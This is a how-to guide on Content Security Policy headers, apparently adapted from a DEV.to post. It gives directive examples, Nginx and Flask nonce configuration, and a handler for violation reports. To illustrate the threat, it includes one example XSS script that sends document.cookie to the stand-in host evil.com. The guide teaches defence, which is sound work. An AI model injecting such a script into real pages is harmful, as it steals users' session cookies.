---
title: 'Content Security Policy (CSP): Protecting Web Applications from XSS and Data
  Injection'
diataxis: How-to Guide
domain: DevSecOps
topic: Security-Testing
source: DEV.to (aymaneldawy)
source_url: https://dev.to/aymaneldawy/what-is-content-security-policy-csp-p6p
date: 2026-07-08
keywords:
- knowledge-base
- Security-Testing
- DevSecOps
- how-to
---
# Content Security Policy (CSP): Protecting Web Applications from XSS and Data Injection

## Overview

**Content Security Policy (CSP)** is an HTTP header mechanism that allows web application developers to define which resources the browser is allowed to load and execute. It serves as a critical defense layer against **Cross-Site Scripting (XSS)**, **data injection attacks**, and **clickjacking**. This note covers CSP fundamentals, directive configuration, and practical implementation patterns.

---

## What Problem Does CSP Solve?

### XSS Attack Vector

Without CSP, an attacker who injects malicious JavaScript into your page can:

```html
<!-- Attacker injects via user input -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

CSP prevents execution of unauthorized scripts by whitelisting allowed sources.

---

## Core CSP Directives

### `default-src`

The fallback directive for all resource types. If a specific directive is not set, the browser uses `default-src`.

```http
Content-Security-Policy: default-src 'self'
```

This allows resources only from the same origin.

### `script-src`

Controls JavaScript execution sources:

```http
# Only allow scripts from same origin and Google Analytics
Content-Security-Policy: script-src 'self' https://www.google-analytics.com

# With nonce-based inline script allowance
Content-Security-Policy: script-src 'self' 'nonce-abc123random'
```

### `style-src`

Controls stylesheet sources:

```http
Content-Security-Policy: style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
```

### `img-src`

Controls image sources:

```http
Content-Security-Policy: img-src 'self' data: https://cdn.example.com
```

### `connect-src`

Controls fetch/XHR/WebSocket destinations:

```http
Content-Security-Policy: connect-src 'self' https://api.example.com wss://ws.example.com
```

### `frame-src` and `child-src`

Controls iframe and worker sources:

```http
Content-Security-Policy: frame-src 'self' https://www.youtube.com
```

### `form-action`

Restricts where form data can be submitted:

```http
Content-Security-Policy: form-action 'self' https://payments.example.com
```

---

## Implementation Guide

### Step 1: Start in Report-Only Mode

```http
# Test without breaking existing functionality
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

### Step 2: Define Your Allowlist

```nginx
# Nginx configuration
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{{random_nonce}}' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https://images.example.com;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  report-uri /csp-violation-report
";
```

### Step 3: Handle Inline Scripts with Nonces

```python
# Flask example: generate nonce per request
import secrets

def generate_nonce():
    return secrets.token_urlsafe(16)

@app.before_request
def add_csp_nonce():
    request.csp_nonce = generate_nonce()

@app.route('/')
def index():
    nonce = request.csp_nonce
    return f"""
    <script nonce="{nonce}">
      // Your inline JavaScript
    </script>
    """
```

### Step 4: Monitor Violations

```javascript
// CSP violation report handler (Node.js/Express)
app.post('/csp-violation-report', (req, res) => {
  const report = req.body;
  console.log('CSP Violation:', {
    blockedURI: report['csp-report'].blockedURI,
    directive: report['csp-report'].directive,
    documentURI: report['csp-report'].documentURI,
  });
  res.status(204).send();
});
```

---

## CSP Levels of Strictness

```
Level 1: Permissive (Start Here)
├─ default-src 'self' https://*.trusted.com
├─ script-src 'self' 'unsafe-inline'
└─ Report-only mode

Level 2: Moderate (Production Ready)
├─ script-src 'self' 'nonce-{{nonce}}'
├─ style-src 'self' 'unsafe-inline'
└─ Active enforcement

Level 3: Strict (Hardened)
├─ script-src 'self' 'strict-dynamic' 'nonce-{{nonce}}'
├─ style-src 'self'
├─ object-src 'none'
└─ block-all-mixed-content
```

---

## Common Pitfalls

1. **`'unsafe-inline'` defeats CSP for scripts**: Removes protection against XSS
2. **`'unsafe-eval'` allows dynamic code execution**: Use only when absolutely necessary
3. **Wildcard `*` in directives**: Too permissive, defeats the purpose
4. **Missing `report-uri`**: No visibility into policy violations
5. **Forgetting CDN resources**: Scripts/styles from CDNs will be blocked

---

## Excalidraw Diagram: CSP Defense Layers

```excalidraw
{"type":"exact","elements":[{"type":"rectangle","x":300,"y":100,"width":300,"height":60,"label":"Browser CSP Engine","strokeColor":"#1a1a1a","backgroundColor":"#fef3c7"},{"type":"rectangle","x":200,"y":200,"width":150,"height":80,"label":"Script Filter\n(script-src)","strokeColor":"#1a1a1a","backgroundColor":"#fee2e2"},{"type":"rectangle","x":450,"y":200,"width":150,"height":80,"label":"Resource Filter\n(img-src, font-src)","strokeColor":"#1a1a1a","backgroundColor":"#dbeafe"},{"type":"rectangle","x":200,"y":320,"width":150,"height":80,"label":"Form Filter\n(form-action)","strokeColor":"#1a1a1a","backgroundColor":"#dcfce7"},{"type":"rectangle","x":450,"y":320,"width":150,"height":80,"label":"Frame Filter\n(frame-src)","strokeColor":"#1a1a1a","backgroundColor":"#e0e7ff"},{"type":"arrow","x":450,"y":160,"width":0,"height":40,"startArrow":"none","endArrow":"arrow","x2":275,"y2":200},{"type":"arrow","x":450,"y":160,"width":0,"height":40,"startArrow":"none","endArrow":"arrow","x2":525,"y2":200},{"type":"arrow","x":450,"y":160,"width":0,"height":160,"startArrow":"none","endArrow":"arrow","x2":275,"y2":320},{"type":"arrow","x":450,"y":160,"width":0,"height":160,"startArrow":"none","endArrow":"arrow","x2":525,"y2":320},{"type":"text","x":100,"y":450,"text":"Each directive independently\nfilters its resource type"}]}
```

---

## References

- [DEV.to: What is Content Security Policy (CSP)?](https://dev.to/aymaneldawy/what-is-content-security-policy-csp-p6p)
- [MDN: Content Security Policy Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP: Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
